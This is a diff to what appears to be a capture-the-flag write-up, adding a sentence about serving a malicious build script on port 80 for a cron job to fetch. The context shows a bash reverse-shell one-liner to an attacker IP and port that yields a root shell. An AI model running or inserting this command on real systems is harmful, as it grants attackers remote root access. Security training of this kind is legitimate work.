@@ -121,6 +121,8 @@ We can then set up a python server containing `downloads/src/buildscript.sh` wit
 bash -i >& /dev/tcp/10.11.47.218/4444 0>&1
 ```
 
+Here we set up the python server, using port 80 as cron will request the default port.
+
 ![[python_server.png]]
 
 Then on a listener we set up earlier, we have a root shell!
